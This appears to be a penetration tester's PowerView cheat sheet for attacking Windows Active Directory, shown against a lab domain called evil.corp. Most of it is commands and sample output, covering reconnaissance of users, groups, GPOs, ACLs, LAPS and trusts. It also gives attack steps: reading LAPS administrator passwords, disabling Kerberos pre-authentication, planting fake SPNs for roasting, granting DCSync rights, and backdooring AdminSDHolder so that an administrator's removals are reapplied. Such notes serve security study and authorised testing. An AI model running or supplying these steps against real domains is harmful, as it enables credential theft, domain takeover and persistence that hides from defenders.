# PowerView

```powershell
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

or

ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```

## Commands

| Function | Description |
| -------- | ----------- |
| Get-Domain | domain name, the forest name and the domain controllers |
| Get-DomainController \| select Forest, Name, OSVersion \| fl | dc dns, forest, OSVersion |
| Get-ForestDomain | all domains for the current forest |
| Get-DomainPolicyData \| select -ExpandProperty SystemAccess | password policy |
| Get-DomainUser -Identity patrick -Properties DisplayName, MemberOf \| fl | Get user (! -IDENTITY IS IMPORTANT OR IT WILL DUMP EVERYTHING) |
| Get-DomainComputer -Properties DnsHostName \| sort -Property DnsHostName | All domain computers |
| Get-DomainOU -Properties Name \| sort -Property Name | All OUs |
| Get-DomainGroup \| where Name -like "*Admins*" \| select SamAccountName | Get all groups filtered |
| Get-DomainGroupMember -Identity "Domain Admins" \| select MemberDistinguishedName | Get all members of a group |
| Get-DomainGPO -Properties DisplayName \| sort -Property DisplayName | Get all GPOs |
| Get-DomainGPO -ComputerIdentity wkstn1 -Properties DisplayName \| sort -Property DisplayName | Get all GPOs of a machine |
| Get-DomainGPOLocalGroup \| select GPODisplayName, GroupName | GPOs that modify local group memberships (restricted groups) |
| Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators \| select ObjectName, GPODisplayName, ContainerName, ComputerName | Get machines where a specific domain user/group is a member of a specific local group |
| Find-DomainUserLocation \| select UserName, SessionFromName | Enum all machines for users/groups where those users are logged into ⚠️#OPSEC LOUD |
| Get-NetSession -ComputerName dc-2 \| select CName, UserName | Session information for the local/remote machine |
| Get-DomainTrust | Get all domain trusts for current or specified domain |

## Default Functions

## [[Domain]]

### Get-Domain

```powershell
Get-Domain

Forest                  : evil.corp
DomainControllers       : {dc-2.edu.evil.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : evil.corp
PdcRoleOwner            : dc-2.edu.evil.corp
RidRoleOwner            : dc-2.edu.evil.corp
InfrastructureRoleOwner : dc-2.edu.evil.corp
Name                    : edu.evil.corp
```

### Get-DomainPolicyData

```powershell
Get-DomainPolicyData | select -ExpandProperty SystemAccess

MinimumPasswordAge           : 1
MaximumPasswordAge           : 42
MinimumPasswordLength        : 7
PasswordComplexity           : 1
PasswordHistorySize          : 24
LockoutBadCount              : 0
RequireLogonToChangePassword : 0
ForceLogoffWhenHourExpire    : 0
ClearTextPassword            : 0
LSAAnonymousNameLookup       : 0
```

### Get-DomainSID

```powershell
Get-DomainSID
```

### Get SID of Group

```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain evil.corp -Properties ObjectSid

objectsid                                   
---------                                   
S-1-5-21-378720957-2217973887-3501892633-512
```

### Convert SID

```powershell
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
```

## [[Domain Controller]]

### Get DC

```powershell
Get-DomainController | select Forest, Name, OSVersion | fl

Forest    : evil.corp
Name      : dc-2.edu.evil.corp
OSVersion : Windows Server 2016 Datacenter
```

```powershell
Get-DomainController -Domain evil.corp | select Name

Name              
----              
dc-1.evil.corp
```

### Get DC via Trust

```powershell
Get-DomainComputer -Domain evil.external -Properties DNSHostName

dnshostname           
-----------           
ad.evil2.corp
```

## [[Domain Forest]]

### Get-ForestDomain

```powershell
Get-ForestDomain

Forest                  : evil.corp
DomainControllers       : {dc-1.evil.corp}
Children                : {edu.evil.corp}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc-1.evil.corp
RidRoleOwner            : dc-1.evil.corp
InfrastructureRoleOwner : dc-1.evil.corp
Name                    : evil.corp

Forest                  : evil.corp
DomainControllers       : {dc-2.edu.evil.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : evil.corp
PdcRoleOwner            : dc-2.edu.evil.corp
RidRoleOwner            : dc-2.edu.evil.corp
InfrastructureRoleOwner : dc-2.edu.evil.corp
Name                    : edu.evil.corp
```

## [[Domain GPOs]] [[Local Administrator Password Solution (LAPS)]]

### Get GPOs filter with name

```powershell
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

displayname    : LAPS
name           : {4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
gpcfilesyspath : \\edu.evil.corp\SysVol\edu.evil.corp\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
```

## [[Domain GPOs]]
### Resolve ObjectDN

Resolve Object Distinguised Name

```powershell
Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName

displayname       
-----------       
PowerShell Logging
```

### Create new GPOs

This PowerView query will show the Security Identifiers (SIDs) of principals that can create new GPOs in the domain, which can be translated via [[PowerView#Convert SID]].

```powershell
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=edu,DC=evil,DC=corp" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Policies,CN=System,DC=edu,DC=evil,DC=corp
ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
```

### Link GPOs

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

ObjectDN           : OU=Workstations,DC=edu,DC=evil,DC=corp
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Servers,DC=edu,DC=evil,DC=corp
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 1,OU=Servers,DC=edu,DC=evil,DC=corp
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 2,OU=Servers,DC=edu,DC=evil,DC=corp
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125
```

### WriteProperty, WriteDacl, WriteOwner

#### Affecting GPOs

This query will return any GPO in the domain, where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results.

```powershell
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=edu,DC=evil,DC=corp
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126
```

[[PowerView#Convert SID]]

#### Affecting user

This query will return any principal that has **GenericAll**, **WriteProperty** or **WriteDacl** on jonas.

```powershell
Get-DomainObjectAcl -Identity jonas | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl

SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
ActiveDirectoryRights : GenericAll

SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
ActiveDirectoryRights : GenericAll

ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
EDU\1st Line Support
```

#### Affecting OU

```powershell
Get-DomainObjectAcl -SearchBase "CN=Users,DC=edu,DC=evil,DC=corp" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Joyce Adam,CN=Users,DC=edu,DC=evil,DC=corp
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=1st Line Support,CN=Users,DC=edu,DC=evil,DC=corp
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Developers,CN=Users,DC=edu,DC=evil,DC=corp
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Oracle Admins,CN=Users,DC=edu,DC=evil,DC=corp
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
```

## [[Domain Computers]]

### Machines within OU

```powershell
Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName

dnshostname            
-----------            
srv1.edu.evil.corp
```

### Get Property of Domain Object

```powershell
Get-DomainObject -Identity wkstn2 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
password123.
```

## [[Domain Computers]] [[Local Administrator Password Solution (LAPS)]]
### Search computers with property

Filter: `ms-Mcs-AdmPwdExpirationTime` not null

```powershell
Get-DomainObject -SearchBase "LDAP://DC=edu,DC=evil,DC=corp" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

dnshostname              
-----------              
wkstn1.edu.evil.corp
wkstn2.edu.evil.corp
```

## [[Shares]]

### Identify Shares

`Find-DomainShare` will find SMB shares in a domain and `-CheckShareAccess` will only display those that the executing principal has access to. via [[PowerView]]

```powershell
Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.edu.evil.corp
```

## [[Domain Users]] [[Sensitive Files]]

### Show DomainObject

```powershell
Get-DomainUser -Identity jonas -Properties ServicePrincipalName

serviceprincipalname
--------------------
fake/NOTHING
```


## [[Change Domain Objects]]

### Change/Clear DomainObject

#### Clear DomainObject

```powershell
Set-DomainObject -Identity jonas -Clear ServicePrincipalName
```

#### Add DONT\_REQ\_PREAUTH flag

```powershell
Get-DomainUser -Identity jonas | ConvertFrom-UACValue

Name                           Value                                                     
----                           -----                                                     NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

Set-DomainObject -Identity jonas -XOR @{UserAccountControl=4194304}

Get-DomainUser -Identity jonas | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512                              
DONT_EXPIRE_PASSWORD           65536                              
DONT_REQ_PREAUTH               4194304

# remove again (XOR is being used)
Set-DomainObject -Identity jonas -XOR @{UserAccountControl=4194304}

Get-DomainUser -Identity jonas | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536
```

#### Assign rights (DCSync)

`Add-DomainObjectAcl` can be used to add a new ACL to a domain object. If we have access to a domain admin account, we can grant dcsync rights to any principal in the domain (a user, group or even computer).

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=edu,DC=evil,DC=corp" -PrincipalIdentity john -Rights DCSync
```

#### Assign rights (AdminSDHolder)

The AdminSDHolder itself is not protected so if we modify the DACL on it, those changes will be replicated to the subsequent objects. So even if an admin see's a rogue DACL on group such as the DA's and removes it, it will just be reapplied again.

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=edu,DC=evil,DC=corp" -PrincipalIdentity john -Rights All
```

## [[Discretionary Access Control Lists (DACL)]] [[Change Domain Objects]]
#### Change DomainObject (SPN)

```powershell
Set-DomainObject -Identity jonas -Set @{serviceprincipalname="fake/NOTHING"}
```

## [[Domain Groups]]

### Get Groups containing users outside of this domain

```powershell
Get-DomainForeignGroupMember -Domain evil.external

GroupDomain             : evil.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external
MemberDomain            : evil.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,
                          DC=external
```

Get the group of the machine

```powershell
Get-NetLocalGroupMember -ComputerName ad.evil.external

ComputerName : ad.evil.external
GroupName    : Administrators
MemberName   : EDU\External Admins
IsGroup      : True
IsDomain     : True
```

Get the users within this group to see who can access this machine

```powershell
Get-DomainGroupMember -Identity "External Admins" | select MemberName

MemberName
----------
jonas
```

[[PowerView#Convert SID]]

### Machines that have identity assigned to a target group

```powershell
Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName

sql1.evil.corp
exch-1.evil.corp
```

## [[Local Administrator Password Solution (LAPS)]]

### Get principals can read LAPS PW

```powershell
Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=edu,DC=evil,DC=corp" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier

ObjectDN                                              SecurityIdentifier
--------                                              ------------------
OU=Workstations,DC=edu,DC=evil,DC=corp            S-1-5-21-3263068140-2042698922-2891547269-1125
CN=wkstn1,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125
```

[[PowerView#Convert SID]]

## [[Constrained Delegation]]

> powerpick Get-DomainComputer -TrustedToAuth powerpick Get-DomainUser -TrustedToAuth

## [[One-Way (Inbound)]]

```powershell
Get-DomainTrust                     #returns all domain trusts for the current domain or a specified domain
Get-ForestTrust                     #returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser               #enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember        #enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping              #this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds
```

[POWERVIEW - MANUAL](https://powersploit.readthedocs.io/en/latest/Recon/)

```meta
requirements: 
results: 
opsec: 
oss: #win
source: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
description: PowerView is a PowerShell tool to gain network situational awareness on Windows domains.
```
